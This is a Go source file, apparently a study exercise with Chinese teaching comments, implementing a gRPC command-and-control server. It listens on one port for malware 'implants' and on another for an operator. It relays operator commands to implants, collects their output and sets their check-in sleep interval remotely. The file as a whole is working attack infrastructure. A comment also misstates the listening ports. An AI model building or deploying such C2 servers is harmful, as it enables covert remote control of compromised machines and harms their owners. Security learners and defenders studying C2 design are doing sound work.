package main

import (
	"Z2/protobufapi"
	"context"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"

	"google.golang.org/grpc"
)

var sleepTime int32 = 3

type implantServer struct {
	work, output chan *protobufapi.Command
}

type clientServer struct {
	work, output chan *protobufapi.Command
}

func NewImplantServer(work, output chan *protobufapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

func NewClientServer(work, output chan *protobufapi.Command) *clientServer {
	s := new(clientServer)
	s.work = work
	s.output = output
	return s
}

func (s *implantServer) FetchCommand(ctx context.Context, empty *protobufapi.Empty) (*protobufapi.Command, error) {
	var cmd = new(protobufapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *protobufapi.Command) (*protobufapi.Empty, error) {
	s.output <- result
	fmt.Println("result:" + result.In + result.Out)
	return &protobufapi.Empty{}, nil
}
func (s *implantServer) GetSleepTime(ctx context.Context, empty *protobufapi.Empty) (*protobufapi.SleepTime, error) {
	time := new(protobufapi.SleepTime)
	time.Time = sleepTime
	return time, nil
}

func (s *clientServer) RunCommand(ctx context.Context, cmd *protobufapi.Command) (*protobufapi.Command, error) {
	fmt.Println(cmd.In)
	var res *protobufapi.Command
	go func() {
		s.work <- cmd
	}()

	res = <-s.output

	return res, nil
}
func (s *clientServer) SetSleepTime(ctx context.Context, time *protobufapi.SleepTime) (*protobufapi.Empty, error) {
	sleepTime = time.Time
	return &protobufapi.Empty{}, nil
}

func main() {
	var (
		implantListener, ClientListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *protobufapi.Command
		implantPort, ClientPort         int
	)
	flag.IntVar(&implantPort, "iport", 1961, "Implant server port")
	flag.IntVar(&ClientPort, "aport", 1962, "Admin server port")
	flag.Parse()

	//这会创建两个 无缓冲 channel，类型都是 chan *protobufapi.Command👇work作为输入队列，out装结果
	work, output = make(chan *protobufapi.Command), make(chan *protobufapi.Command)
	//植入程序服务端和管理程序服务端使用相同的通道
	implant := NewImplantServer(work, output)
	client := NewClientServer(work, output)
	//服务端建立监听，植入服务端与管理服务端监听的端口分别是4001和4002
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", implantPort)); err != nil {
		log.Fatalln("implantserver" + err.Error())
	}
	if ClientListener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", ClientPort)); err != nil {
		log.Fatalln("adminserver" + err.Error())
	}
	opts = []grpc.ServerOption{
		grpc.MaxRecvMsgSize(1024 * 1024 * 12),
		grpc.MaxSendMsgSize(1024 * 1024 * 12),
	}
	grpcClientServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)

	protobufapi.RegisterImplantServer(grpcImplantServer, implant)
	protobufapi.RegisterClientServer(grpcClientServer, client)
	//使用goroutine启动植入程序服务端，防止代码阻塞，毕竟后面还要开启管理程序服务端
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcClientServer.Serve(ClientListener)

}
